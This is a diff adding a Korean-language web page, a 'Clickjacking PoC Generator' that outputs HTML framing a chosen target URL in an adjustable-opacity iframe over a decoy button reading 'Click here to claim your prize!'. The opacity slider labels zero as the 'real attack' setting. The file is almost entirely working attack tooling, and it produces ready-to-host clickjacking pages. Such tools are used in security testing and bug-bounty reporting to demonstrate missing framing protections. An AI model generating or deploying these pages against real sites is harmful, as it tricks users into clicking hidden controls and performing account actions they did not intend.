@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Clickjacking PoC Generator</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { min-height: 100vh; background: #0d1117; color: #e6edf3; font-family: 'Segoe UI', sans-serif; padding: 2rem 1rem; }
+    header { display: flex; align-items: center; gap: 1rem; max-width: 1100px; margin: 0 auto 2rem; }
+    header a { color: #8b949e; text-decoration: none; font-size: 0.9rem; }
+    header a:hover { color: #58a6ff; }
+    h1 { font-size: 1.6rem; color: #58a6ff; }
+    .container { max-width: 1100px; margin: 0 auto; }
+    .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+    @media (max-width: 800px) { .grid { grid-template-columns: 1fr; } }
+    .panel { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 1.5rem; }
+    .panel h2 { font-size: 1rem; color: #8b949e; margin-bottom: 1.2rem; padding-bottom: 0.75rem; border-bottom: 1px solid #30363d; }
+    .form-group { margin-bottom: 1rem; }
+    label { display: block; font-size: 0.8rem; color: #8b949e; margin-bottom: 0.4rem; }
+    input[type=text], input[type=number], textarea, select {
+      width: 100%; background: #0d1117; border: 1px solid #30363d; border-radius: 8px;
+      color: #e6edf3; font-size: 0.9rem; padding: 0.55rem 0.75rem; outline: none; transition: border-color 0.2s;
+    }
+    input:focus, textarea:focus, select:focus { border-color: #58a6ff; }
+    .range-row { display: flex; align-items: center; gap: 0.75rem; }
+    input[type=range] { flex: 1; accent-color: #58a6ff; }
+    .range-val { font-size: 0.85rem; color: #58a6ff; width: 3rem; text-align: right; }
+    .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem; }
+    button { padding: 0.5rem 1.2rem; border-radius: 8px; border: none; cursor: pointer; font-size: 0.9rem; font-weight: 600; transition: opacity 0.2s; }
+    button:hover { opacity: 0.85; }
+    .btn-row { display: flex; gap: 0.75rem; margin-top: 1.2rem; flex-wrap: wrap; }
+    .btn-gen  { background: #1f6feb; color: #fff; }
+    .btn-copy { background: #30363d; color: #e6edf3; }
+    .btn-prev { background: #238636; color: #fff; }
+    textarea.code { height: 260px; font-family: 'Courier New', monospace; font-size: 0.82rem; resize: vertical; }
+    .preview-wrap {
+      background: #0d1117; border: 1px solid #30363d; border-radius: 8px;
+      margin-top: 1rem; overflow: hidden; position: relative; height: 340px;
+    }
+    .preview-iframe { width: 100%; height: 100%; border: none; }
+    .preview-label { position: absolute; top: 0.5rem; left: 0.75rem; font-size: 0.7rem; color: #8b949e; pointer-events: none; }
+    .toast { position: fixed; bottom: 2rem; right: 2rem; background: #238636; color: #fff;
+             padding: 0.6rem 1.2rem; border-radius: 8px; font-size: 0.85rem; opacity: 0; transition: opacity 0.3s; pointer-events: none; }
+    .toast.show { opacity: 1; }
+  </style>
+</head>
+<body>
+  <header>
+    <a href="index.html">← 홈</a>
+    <h1>Clickjacking PoC Generator</h1>
+  </header>
+
+  <div class="container">
+    <div class="grid">
+      <!-- 설정 패널 -->
+      <div class="panel">
+        <h2>설정</h2>
+
+        <div class="form-group">
+          <label>Target URL (iframe src)</label>
+          <input type="text" id="targetUrl" placeholder="https://target.com/account/settings">
+        </div>
+
+        <div class="form-group">
+          <label>iframe 투명도 — 0: 완전 투명 (실제 공격), 100: 완전 불투명 (테스트용)</label>
+          <div class="range-row">
+            <input type="range" id="opacity" min="0" max="100" value="50" oninput="updateRange(this,'opacityVal')">
+            <span class="range-val" id="opacityVal">50%</span>
+          </div>
+        </div>
+
+        <div class="form-group two-col">
+          <div>
+            <label>iframe Width</label>
+            <input type="text" id="iframeW" value="500px">
+          </div>
+          <div>
+            <label>iframe Height</label>
+            <input type="text" id="iframeH" value="700px">
+          </div>
+        </div>
+
+        <div class="form-group two-col">
+          <div>
+            <label>Decoy Button 위치 Top</label>
+            <input type="text" id="btnTop" value="340px">
+          </div>
+          <div>
+            <label>Decoy Button 위치 Left</label>
+            <input type="text" id="btnLeft" value="60px">
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label>Decoy Button 텍스트</label>
+          <input type="text" id="btnText" value="Click here to claim your prize!">
+        </div>
+
+        <div class="form-group">
+          <label>Decoy 배경 색상</label>
+          <input type="text" id="bgColor" value="#ffffff">
+        </div>
+
+        <div class="btn-row">
+          <button class="btn-gen" onclick="generate()">PoC 생성</button>
+          <button class="btn-prev" onclick="livePreview()">미리보기 업데이트</button>
+        </div>
+      </div>
+
+      <!-- 출력 패널 -->
+      <div class="panel">
+        <h2>생성된 PoC HTML</h2>
+        <textarea class="code" id="output" placeholder="PoC 코드가 여기에 생성됩니다..."></textarea>
+        <div class="btn-row">
+          <button class="btn-copy" onclick="copyOutput()">Copy</button>
+          <button class="btn-gen" onclick="openWindow()">새 탭에서 열기</button>
+        </div>
+
+        <div class="preview-wrap">
+          <span class="preview-label">Live Preview (blob URL)</span>
+          <iframe class="preview-iframe" id="previewFrame" sandbox="allow-scripts allow-same-origin allow-forms"></iframe>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="toast" id="toast">복사 완료!</div>
+
+  <script>
+    function updateRange(el, valId) {
+      document.getElementById(valId).textContent = el.value + '%';
+    }
+
+    function buildHtml() {
+      const url    = document.getElementById('targetUrl').value.trim() || 'https://target.com/';
+      const op     = (document.getElementById('opacity').value / 100).toFixed(2);
+      const iw     = document.getElementById('iframeW').value || '500px';
+      const ih     = document.getElementById('iframeH').value || '700px';
+      const top    = document.getElementById('btnTop').value  || '300px';
+      const left   = document.getElementById('btnLeft').value || '60px';
+      const txt    = document.getElementById('btnText').value || 'Click me';
+      const bg     = document.getElementById('bgColor').value || '#ffffff';
+
+      return `<!DOCTYPE html>
+<html>
+<head>
+  <title>Clickjacking PoC</title>
+  <style>
+    body { background: ${bg}; margin: 0; }
+    #decoy-btn {
+      position: absolute;
+      top: ${top};
+      left: ${left};
+      z-index: 1;
+      padding: 12px 24px;
+      background: #ff6200;
+      color: #fff;
+      font-size: 1rem;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    #target-iframe {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: ${iw};
+      height: ${ih};
+      opacity: ${op};
+      z-index: 2;
+      border: none;
+    }
+  </style>
+</head>
+<body>
+  <button id="decoy-btn">${txt}</button>
+  <iframe id="target-iframe" src="${url}"></iframe>
+</body>
+</html>`;
+    }
+
+    function generate() {
+      document.getElementById('output').value = buildHtml();
+      livePreview();
+    }
+
+    function livePreview() {
+      const html = document.getElementById('output').value || buildHtml();
+      const blob = new Blob([html], { type: 'text/html' });
+      document.getElementById('previewFrame').src = URL.createObjectURL(blob);
+    }
+
+    function openWindow() {
+      const val = document.getElementById('output').value;
+      if (!val) { alert('먼저 PoC를 생성하세요.'); return; }
+      const blob = new Blob([val], { type: 'text/html' });
+      window.open(URL.createObjectURL(blob));
+    }
+
+    function copyOutput() {
+      const val = document.getElementById('output').value;
+      if (!val) return;
+      navigator.clipboard.writeText(val).then(() => showToast());
+    }
+
+    function showToast() {
+      const t = document.getElementById('toast');
+      t.classList.add('show');
+      setTimeout(() => t.classList.remove('show'), 1500);
+    }
+
+    // 초기 미리보기
+    generate();
+  </script>
+</body>
+</html>
